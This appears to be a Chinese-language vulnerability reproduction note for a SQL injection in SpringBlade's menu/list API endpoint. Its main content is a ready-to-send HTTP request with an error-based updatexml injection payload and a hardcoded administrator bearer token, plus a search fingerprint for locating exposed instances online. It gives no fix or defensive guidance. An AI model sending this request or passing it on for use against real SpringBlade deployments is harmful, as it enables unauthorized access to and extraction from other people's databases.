# SpringBlade menu/list存在SQL注入漏洞

# 一、漏洞简介
SpringBlade menu/list存在SQL注入漏洞，攻击者利用该漏洞进行SQL注 入攻击

# 二、影响版本
+ SpringBlade

# 三、资产测绘
+ `<font style="color:rgb(63, 63, 63);">body="https://bladex.vip"</font>`

![1703260241729-c77ed022-a493-4621-983c-5ec64ddbde71.png](./img/NmezmB28oxn8h0Aq/1703260241729-c77ed022-a493-4621-983c-5ec64ddbde71-536775.png)

# 四、漏洞复现
```java
GET /api/blade-system/menu/list?updatexml(1,concat(0x7e,md5(1),0x7e),1)=1 HTTP/1.1
Host: 
User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ
Connection: close
```

![1722875246289-eb2f34cb-92d8-49de-a81b-3479b1c8353a.png](./img/NmezmB28oxn8h0Aq/1722875246289-eb2f34cb-92d8-49de-a81b-3479b1c8353a-514494.png)



> 更新: 2024-12-13 17:10:56  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xz7mg8lxlbnt5kp0>